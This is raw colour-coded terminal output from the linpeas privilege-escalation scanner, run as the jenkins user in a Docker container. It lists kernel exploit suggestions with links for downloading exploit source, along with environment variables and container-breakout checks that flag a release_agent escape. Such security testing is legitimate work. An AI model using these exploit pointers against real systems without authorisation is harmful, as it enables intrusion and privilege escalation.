[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;74;217;38m[38;2;73;217;37m▄[48;2;114;194;86m[38;2;76;215;40m▄[48;2;142;178;121m[38;2;94;205;62m▄[48;2;150;176;129m[38;2;109;196;81m▄[48;2;142;180;120m[38;2;95;203;63m▄[48;2;116;193;88m[38;2;76;214;41m▄[48;2;78;213;44m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;67;196;36m▄[48;2;71;209;37m[38;2;60;154;36m▄[48;2;59;152;36m[38;2;57;138;37m▄[48;2;52;110;38m[38;2;56;130;37m▄[48;2;51;104;38m[38;2;30;71;21m▄[48;2;20;31;17m[38;2;45;69;39m▄[48;2;50;78;44m[38;2;51;78;45m▄[48;2;51;78;45m [0m
         [48;2;51;78;45m[38;2;28;43;24m▄[48;2;51;78;45m[38;2;43;64;38m▄[48;2;51;78;45m[38;2;52;79;46m▄[48;2;34;53;30m[38;2;46;71;41m▄[48;2;64;124;48m[38;2;49;106;36m▄[48;2;53;115;38m[38;2;57;124;40m▄[48;2;63;175;36m[38;2;55;126;38m▄[48;2;73;217;37m[38;2;66;186;36m▄[48;2;89;208;56m[38;2;73;217;37m▄[48;2;111;195;82m[38;2;75;215;40m▄[48;2;109;197;80m[38;2;74;216;38m▄[48;2;85;209;52m[38;2;73;218;36m▄[48;2;73;216;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;36m[38;2;73;218;37m▄[48;2;73;218;37m[38;2;71;214;36m▄[48;2;71;212;36m[38;2;63;172;36m▄[48;2;63;174;35m[38;2;57;138;37m▄[48;2;58;146;36m[38;2;57;137;38m▄[48;2;58;139;37m[38;2;57;138;37m▄[48;2;58;138;37m[38;2;54;128;35m▄[48;2;50;117;34m[38;2;20;44;14m▄[48;2;20;32;17m[38;2;39;61;34m▄[48;2;51;77;44m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;49;75;43m▄[0m
         [48;2;84;151;67m[38;2;98;177;78m▄[48;2;43;80;34m[38;2;98;177;78m▄[48;2;22;39;19m[38;2;98;178;78m▄[48;2;43;67;38m[38;2;81;148;64m▄[48;2;40;70;33m[38;2;44;78;36m▄[48;2;54;127;36m[38;2;21;47;15m▄[48;2;55;120;39m[38;2;54;117;39m▄[48;2;56;133;37m[38;2;59;133;40m▄[48;2;71;211;36m[38;2;61;164;37m▄[48;2;73;217;36m[38;2;71;211;36m▄[48;2;73;218;37m[38;2;72;218;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;72;217;36m▄[48;2;73;218;37m[38;2;67;203;34m▄[48;2;68;194;37m[38;2;40;116;21m▄[48;2;58;142;36m[38;2;8;21;5m▄[48;2;49;120;31m[38;2;6;10;5m▄[48;2;25;59;16m[38;2;73;108;65m▄[48;2;15;33;11m[38;2;95;157;79m▄[48;2;12;25;9m[38;2;97;175;77m▄[48;2;21;32;19m[38;2;99;179;79m▄[48;2;23;35;19m[38;2;98;178;78m▄[48;2;20;34;17m[38;2;98;178;78m▄[48;2;13;24;11m[38;2;98;178;78m▄[48;2;16;26;14m[38;2;98;177;78m▄[0m
         [48;2;97;176;77m[38;2;58;103;46m▄[48;2;98;177;78m[38;2;94;170;75m▄[48;2;98;177;78m[38;2;99;179;79m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;97;176;77m[38;2;98;177;78m▄[48;2;91;165;72m[38;2;98;177;78m▄[48;2;55;100;44m[38;2;98;177;78m▄[48;2;15;27;10m[38;2;92;168;73m▄[48;2;24;46;18m[38;2;76;138;61m▄[48;2;73;154;53m[38;2;54;96;43m▄[48;2;74;213;39m[38;2;24;48;18m▄[48;2;74;222;37m[38;2;20;55;11m▄[48;2;73;217;37m[38;2;31;91;16m▄[48;2;73;218;37m[38;2;49;145;24m▄[48;2;73;218;37m[38;2;68;201;35m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;74;220;37m▄[48;2;73;218;37m[38;2;73;219;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;220;37m▄[48;2;73;218;37m[38;2;72;214;37m▄[48;2;73;218;37m[38;2;63;187;32m▄[48;2;72;217;36m[38;2;41;120;22m▄[48;2;74;222;36m[38;2;21;52;13m▄[48;2;67;203;34m[38;2;39;62;34m▄[48;2;40;117;21m[38;2;64;103;54m▄[48;2;14;43;7m[38;2;72;126;57m▄[48;2;4;12;2m[38;2;87;156;69m▄[48;2;25;45;21m[38;2;97;174;78m▄[48;2;71;124;57m[38;2;99;177;80m▄[48;2;97;168;78m[38;2;94;170;75m▄[48;2;96;175;77m[38;2;103;177;84m▄[48;2;98;176;79m[38;2;109;183;90m▄[48;2;100;178;80m[38;2;112;185;94m▄[48;2;100;177;80m[38;2;111;184;92m▄[48;2;99;177;80m[38;2;107;182;89m▄[48;2;98;177;78m[38;2;105;182;85m▄[48;2;98;177;78m[38;2;103;180;83m▄[48;2;98;177;78m[38;2;99;177;79m▄[0m
          [38;2;54;79;47m▀[38;2;72;123;60m▀[48;2;97;176;78m[38;2;65;87;60m▄[48;2;98;177;78m[38;2;73;130;59m▄[48;2;98;177;78m[38;2;91;165;72m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;96;172;77m[38;2;98;177;78m▄[48;2;82;147;65m[38;2;98;177;78m▄[48;2;66;116;52m[38;2;98;177;78m▄[48;2;46;78;38m[38;2;98;177;78m▄[48;2;27;51;20m[38;2;98;177;78m▄[48;2;28;60;20m[38;2;94;169;74m▄[48;2;28;67;19m[38;2;86;155;69m▄[48;2;34;96;19m[38;2;69;123;54m▄[48;2;42;126;21m[38;2;48;86;39m▄[48;2;51;148;27m[38;2;36;64;28m▄[48;2;55;164;28m[38;2;26;46;20m▄[48;2;60;180;30m[38;2;23;39;18m▄[48;2;62;186;31m[38;2;21;40;17m▄[48;2;61;181;31m[38;2;19;36;16m▄[48;2;67;176;40m[38;2;18;32;14m▄[48;2;63;173;35m[38;2;23;36;19m▄[48;2;56;168;29m[38;2;27;42;23m▄[48;2;53;160;27m[38;2;29;45;24m▄[48;2;44;133;22m[38;2;30;53;25m▄[48;2;34;102;17m[38;2;52;89;43m▄[48;2;20;60;10m[38;2;88;148;71m▄[48;2;24;47;19m[38;2;97;171;78m▄[48;2;34;62;27m[38;2;98;177;78m▄[48;2;55;99;44m[38;2;98;177;78m▄[48;2;80;144;64m[38;2;98;177;78m▄[48;2;99;176;79m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;99;177;79m▄[48;2;99;177;79m[38;2;96;172;76m▄[48;2;99;175;79m[38;2;85;151;68m▄[48;2;95;169;76m[38;2;72;121;60m▄[48;2;109;180;92m[38;2;37;57;32m▄[48;2;100;159;85m[38;2;38;41;36m▄[48;2;72;107;62m[38;2;74;74;74m▄[0m[38;2;44;65;38m▀[38;2;31;48;27m▀[38;2;31;48;26m▀[38;2;31;52;25m▀[38;2;41;71;34m▀[38;2;59;97;50m▀[0m
               [38;2;95;106;94m▀[38;2;81;137;65m▀[38;2;91;166;73m▀[48;2;95;174;76m[38;2;61;73;59m▄[48;2;98;177;78m[38;2;33;66;26m▄[48;2;98;177;78m[38;2;81;143;65m▄[48;2;98;177;78m[38;2;102;182;81m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;99;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;97;177;77m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m[38;2;99;179;78m▄[48;2;98;177;78m[38;2;93;169;74m▄[48;2;98;177;78m[38;2;56;106;44m▄[48;2;96;174;77m[38;2;16;31;13m▄[48;2;68;126;54m[38;2;58;58;58m▄[0m[38;2;28;50;23m▀[38;2;20;22;20m▀[0m
                     [38;2;41;52;39m▀[38;2;39;76;30m▀[38;2;73;136;57m▀[48;2;90;162;72m[38;2;96;100;95m▄[48;2;99;175;79m[38;2;60;69;58m▄[48;2;98;177;78m[38;2;46;59;43m▄[48;2;98;177;78m[38;2;32;51;27m▄[48;2;98;178;78m[38;2;28;50;23m▄[48;2;98;178;78m[38;2;28;55;22m▄[48;2;98;178;78m[38;2;35;64;28m▄[48;2;98;177;78m[38;2;41;75;33m▄[48;2;98;177;78m[38;2;50;89;41m▄[48;2;98;177;77m[38;2;54;89;45m▄[48;2;98;177;77m[38;2;53;89;44m▄[48;2;98;177;78m[38;2;49;86;39m▄[48;2;98;177;78m[38;2;45;83;36m▄[48;2;98;177;78m[38;2;40;74;32m▄[48;2;98;177;78m[38;2;35;64;28m▄[48;2;98;178;78m[38;2;39;60;33m▄[48;2;90;163;71m[38;2;55;61;53m▄[0m[38;2;53;97;41m▀[38;2;24;44;19m▀[38;2;36;41;35m▀[0m

    [1;32m/---------------------------------------------------------------------------------\
    |                             [1;34mDo you like PEASS?[1;32m                                  |
    |---------------------------------------------------------------------------------|
    |         [1;33mGet the latest version[1;32m    :     [1;31mhttps://github.com/sponsors/carlospolop[1;32m |
    |         [1;33mFollow on Twitter[1;32m         :     [1;31m@hacktricks_live[1;32m                        |
    |         [1;33mRespect on HTB[1;32m            :     [1;31mSirBroccoli            [1;32m                 |
    |---------------------------------------------------------------------------------|
    |                                 [1;34mThank you! [1;32m                                     |
    \---------------------------------------------------------------------------------/
[1;34m          linpeas-ng [1;33mby carlospolop
[0m
[1;33mADVISORY: [1;34mThis script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
[0m
[1;34mLinux Privesc Checklist: [1;33mhttps://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
[0m [1;4mLEGEND[0m:
  [1;31;103mRED/YELLOW[0m: 95% a PE vector
  [1;31mRED[0m: You should take a look to it
  [1;96mLightCyan[0m: Users with console
  [1;34mBlue[0m: Users without console & mounted devs
  [1;32mGreen[0m: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  [1;95mLightMagenta[0m: Your username

 [1;90mStarting linpeas. Caching Writable Folders...[0m

[1;34m                               ╔═══════════════════╗
═══════════════════════════════╣ [1;32mBasic information[1;34m ╠═══════════════════════════════
[1;34m                               ╚═══════════════════╝[0m
[1;37mOS: [0mLinux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
[1;37mUser & Groups: [0muid=1000([1;96m[1;95mjenkins[0m[0m) gid=1000([1;96m[1;95mjenkins[0m[0m) groups=1000([1;96m[1;95mjenkins[0m[0m)
[1;37mHostname: [0mjenkins
[1;37mWritable folder: [0m/dev/shm
[1;33m[+] [1;32m/bin/ping[1;34m is available for network discovery[1;37m (linpeas can discover hosts, learn more with -h)
[0m[1;33m[+] [1;32m/bin/bash[1;34m is available for network discovery, port scanning and port forwarding[1;37m (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)

[0m

[1;32mCaching directories [0m[1;33mDONE
[0m
[1;34m                              ╔════════════════════╗
══════════════════════════════╣ [1;32mSystem Information[1;34m ╠══════════════════════════════
[1;34m                              ╚════════════════════╝[0m
[1;34m╔══════════╣ [1;32mOperative system
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
[0mLinux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
[1;90mlsb_release Not Found
[0m
[1;34m╔══════════╣ [1;32mSudo version
[0m[1;90msudo Not Found
[0m

[1;34m╔══════════╣ [1;32mPATH
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
[0m/usr/local/openjdk-8/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;34m╔══════════╣ [1;32mDate & uptime
[0mWed Oct  4 22:10:16 UTC 2023
 22:10:16 up  1:02,  0 users,  load average: 0.02, 0.01, 0.41

[1;34m╔══════════╣ [1;32mAny sd*/disk* disk in /dev? (limit 20)
[0m
[1;34m╔══════════╣ [1;32mUnmounted file-system?
[0m[1;34m╚ [1;34m[3mCheck if you can mount umounted devices
[0m
[1;34m╔══════════╣ [1;32mEnvironment
[0m[1;34m╚ [1;34m[3mAny private information inside environment variables?
[0mJENKINS_HOME=/var/jenkins_home
JAVA_URL_VERSION=8u242b08
HISTFILESIZE=0
JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental
HOSTNAME=jenkins
SHLVL=0
HOME=/var/jenkins_home
JAVA_BASE_URL=https://github.com/AdoptOpenJDK/openjdk8-upstream-binaries/releases/download/jdk8u242-b08/OpenJDK8U-jdk_
OLD[1;31mPWD[0m=/
JENKINS_UC=https://updates.jenkins.io
REF=/usr/share/jenkins/ref
JAVA_VERSION=8u242
JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals
JENKINS_VERSION=2.250
PATH=/usr/local/openjdk-8/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
HISTSIZE=0
JENKINS_SLAVE_AGENT_PORT=50000
JAVA_HOME=/usr/local/openjdk-8
[1;31mPWD[0m=/tmp
COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log
HISTFILE=/dev/null

[1;34m╔══════════╣ [1;32mSearching Signature verification failed in dmesg
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
[0m[1;90mdmesg Not Found
[0m
[1;34m╔══════════╣ [1;32mExecuting Linux Exploit Suggester
[0m[1;34m╚ [1;34m[3mhttps://github.com/mzet-/linux-exploit-suggester
[0m[+] [1;31m[CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)[0m

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [1;31m[CVE-2022-2586] nft_object UAF[0m

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [1;31m[CVE-2021-27365] linux-iscsi[0m

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [1;31m[CVE-2021-22555] Netfilter heap out-of-bounds write[0m

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [1;31m[CVE-2019-15666] XFRM_UAF[0m

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [1;31m[CVE-2018-1000001] RationalLove[0m

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries


[1;34m╔══════════╣ [1;32mExecuting Linux Exploit Suggester 2
[0m[1;34m╚ [1;34m[3mhttps://github.com/jondonas/linux-exploit-suggester-2
[0m
[1;34m╔══════════╣ [1;32mProtections
[0m[1;34m═╣ [1;32mAppArmor enabled? .............. [0m[0m[1;90mAppArmor Not Found
[0m[1;34m═╣ [1;32mAppArmor profile? .............. [0m[0mdocker-default (enforce)
[1;34m═╣ [1;32mis linuxONE? ................... [0m[0m[1;90ms390x Not Found
[0m[1;34m═╣ [1;32mgrsecurity present? ............ [0m[0m[1;90mgrsecurity Not Found
[0m[1;34m═╣ [1;32mPaX bins present? .............. [0m[0m[1;90mPaX Not Found
[0m[1;34m═╣ [1;32mExecshield enabled? ............ [0m[0m[1;90mExecshield Not Found
[0m[1;34m═╣ [1;32mSELinux enabled? ............... [0m[0m[1;90msestatus Not Found
[0m[1;34m═╣ [1;32mSeccomp enabled? ............... [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32mUser namespace? ................ [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32mCgroup2 enabled? ............... [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32mIs ASLR enabled? ............... [0m[0m[1;32mYes[0m
[1;34m═╣ [1;32mPrinter? ....................... [0m[0m[1;90mNo
[0m[1;34m═╣ [1;32mIs this a virtual machine? ..... [0m[0m[1;31mYes[0m

[1;34m                                   ╔═══════════╗
═══════════════════════════════════╣ [1;32mContainer[1;34m ╠═══════════════════════════════════
[1;34m                                   ╚═══════════╝[0m
[1;34m╔══════════╣ [1;32mContainer related tools present (if any):
[0m[1;34m╔══════════╣ [1;32mAm I Containered?
[0m[1;34m╔══════════╣ [1;32mContainer details
[0m[1;34m═╣ [1;32mIs this a container? ...........[0m docker
[0m[1;34m═╣ [1;32mAny running containers? ........ [0m[0m[1;90mNo
[0m[1;34m╔══════════╣ [1;32mDocker Container details
[0m[1;34m═╣ [1;32mAm I inside Docker group .......[0m No
[0m[1;34m═╣ [1;32mLooking and enumerating Docker Sockets (if any):
[0m[0m[1;34m═╣ [1;32mDocker version .................[0m[1;90m Not Found
[0m[0m[1;34m═╣ [1;32mVulnerable to CVE-2019-5736 ....[0m[1;90m Not Found
[0m[0m[0m[1;34m═╣ [1;32mVulnerable to CVE-2019-13139 ...[0m[1;90m Not Found
[0m[0m[0m[1;34m═╣ [1;32mRootless Docker? ............... [1;31mNo[0m
[0m[0m

[1;34m╔══════════╣ [1;32mContainer & breakout enumeration
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
[0m[1;34m═╣ [1;32mContainer ID ...................[0m jenkins[0m[1;34m═╣ [1;32mContainer Full ID ..............[0m 7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2
[0m[1;34m═╣ [1;32mSeccomp enabled? ............... [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32mAppArmor profile? .............. [0m[0mdocker-default (enforce)
[1;34m═╣ [1;32mUser proc namespace? ........... [0m[0m[1;32menabled[0m         0          0 4294967295
[1;34m═╣ [1;32mVulnerable to CVE-2019-5021 .... [1;90mNo
[0m
[0m[0m[1;34m══╣ [1;32mBreakout via mounts
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
[0m[1;34m═╣ [1;32m/proc mounted? ................. No
[0m[1;34m═╣ [1;32m/dev mounted? .................. No
[0m[1;34m═╣ [1;32mRun ushare ..................... No
[0m[1;34m═╣ [1;32mrelease_agent breakout 1........ [1;31mYes[0m
[0m[1;34m═╣ [1;32mrelease_agent breakout 2........ No
[0m[1;34m═╣ [1;32mcore_pattern breakout .......... No
[0m[1;34m═╣ [1;32mbinfmt_misc breakout ........... No
[0m[1;34m═╣ [1;32muevent_helper breakout ......... No
[0m[1;34m═╣ [1;32mis modprobe present ............ No
[0m[1;34m═╣ [1;32mDoS via panic_on_oom ........... No
[0m[1;34m═╣ [1;32mDoS via panic_sys_fs ........... No
[0m[1;34m═╣ [1;32mDoS via sysreq_trigger_dos ..... No
[0m[1;34m═╣ [1;32m/proc/config.gz readable ....... No
[0m[1;34m═╣ [1;32m/proc/sched_debug readable ..... [1;31mYes[0m
[0m[1;34m═╣ [1;32m/proc/*/mountinfo readable ..... No
[0m[1;34m═╣ [1;32m/sys/kernel/security present ... [1;31mYes[0m
[0m[1;34m═╣ [1;32m/sys/kernel/security writable .. No
[0m
[1;34m══╣ [1;32mNamespaces
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces
[0mtotal 0
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 cgroup -> cgroup:[4026531835]
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 ipc -> ipc:[4026532299]
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 mnt -> mnt:[4026532297]
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 net -> net:[4026532302]
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 pid -> pid:[4026532300]
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 pid_for_children -> pid:[4026532300]
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 user -> user:[4026531837]
lrwxrwxrwx 1 jenkins jenkins 0 Oct  4 22:10 uts -> uts:[4026532298]

[1;34m╔══════════╣ [1;32mContainer Capabilities
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
[0mCapInh:[1;31m [1;32m00000000a80425fb[0m=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap[0m
CapPrm:[1;31m [1;32m0000000000000000[0m[0m
CapEff:[1;31m [1;32m0000000000000000[0m[0m
CapBnd:[1;31m [1;32m00000000a80425fb[0m=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap[0m
CapAmb:[1;31m [1;32m0000000000000000[0m[0m
[3mRun capsh --decode=<hex> to decode the capabilities[0m

[1;34m╔══════════╣ [1;32mPrivilege Mode
[0mPrivilege Mode is [1;32mdisabled[0m

[1;34m╔══════════╣ [1;32mInteresting Files Mounted
[0moverlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/D76SO6OW6ZC7F73CNLWGE6VNJ2:/var/lib/docker/overlay2/l/R7JUMTMAHHWT2IPHDBODXUAUX4:/var/lib/docker/overlay2/l/ILLHFZAQIXBHQV5TBK6H6QKRPU:/var/lib/docker/overlay2/l/ZJIGQHBKX2F2WO5H6IBIUAPQNJ:/var/lib/docker/overlay2/l/PYJJ2J6GNKRZM5NKU3DDCJMXTE:/var/lib/docker/overlay2/l/Y56C3PACMQWAJXR623EYAIWFJE:/var/lib/docker/overlay2/l/JDSU2EUN7J5LCID2KTGWBRHH7F:/var/lib/docker/overlay2/l/TLWHCQDYH7TG6HBLGBDKGXPYDN:/var/lib/docker/overlay2/l/PORON3AUGRPAWBGQB2YHVURE5J:/var/lib/docker/overlay2/l/Z4YND3PVSRZT2YCZX2KNWZ65G4:/var/lib/docker/overlay2/l/ELNNZKIFVN6C3JFJJRPWCWT4AR:/var/lib/docker/overlay2/l/WV2AFXGD64YPGSMVLAFMEC2UUH:/var/lib/docker/overlay2/l/FSFUE3N3DSGII2N6TGW6XXUPMK:/var/lib/docker/overlay2/l/WA4ALXYE7MCPJ3NKZMBE67EMM4:/var/lib/docker/overlay2/l/RERZPV3H2OZJN4KIQFQXQH3JLX:/var/lib/docker/overlay2/l/HZUMXGAH6MQYUUXSYUXGCTED7I:/var/lib/docker/overlay2/l/J6XFGN4UK5YNSSVZU5NISQDGCY:/var/lib/docker/overlay2/l/6TJFFL5AFO3DJNPAODNSC5LNHG:/var/lib/docker/overlay2/l/GJDK7MJZHHWSEFUJLMGYPLD6KI:/var/lib/docker/overlay2/l/YHVIE6OWVYKNDYL4KEVWIZKL2J,upperdir=/var/lib/docker/overlay2/69063742c47cbbc18850039be21f9ff91e4b11303e1cd8cc3c14ef5bda05346b/diff,workdir=/var/lib/docker/overlay2/69063742c47cbbc18850039be21f9ff91e4b11303e1cd8cc3c14ef5bda05346b/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on [1;31m/dev/[0mpts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
mqueue on [1;31m/dev/[0mmqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on [1;31m/dev/[0mshm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
[1;31m/dev/[0mmapper/ubuntu--vg-ubuntu--lv on /var/jenkins_home type ext4 (rw,relatime,data=ordered)
[1;31m/dev/[0mmapper/ubuntu--vg-ubuntu--lv on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)
[1;31m/dev/[0mmapper/ubuntu--vg-ubuntu--lv on /etc/hostname type ext4 (rw,relatime,data=ordered)
